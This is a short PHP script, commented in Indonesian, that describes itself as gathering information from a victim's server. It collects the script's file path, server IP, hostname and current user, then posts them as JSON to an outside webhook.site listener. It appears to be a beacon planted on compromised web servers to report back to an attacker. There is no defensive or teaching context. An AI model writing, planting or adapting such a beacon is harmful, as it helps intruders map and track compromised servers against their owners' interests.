<?php
$listener_url = "https://webhook.site/bc3868e9-fd2d-464e-8c26-1f62a9408202";

// Kumpulkan informasi penting dari server korban
$data = [
    'file_location' => __FILE__,
    'server_ip'     => $_SERVER['SERVER_ADDR'],
    'hostname'      => gethostname(),
    'user'          => get_current_user()
];

// Kirim data sebagai JSON menggunakan cURL
$options = [
    'http' => [
        'header'  => "Content-type: application/json\r\n",
        'method'  => 'POST',
        'content' => json_encode($data),
    ],
];

$context  = stream_context_create($options);
file_get_contents($listener_url, false, $context);
?>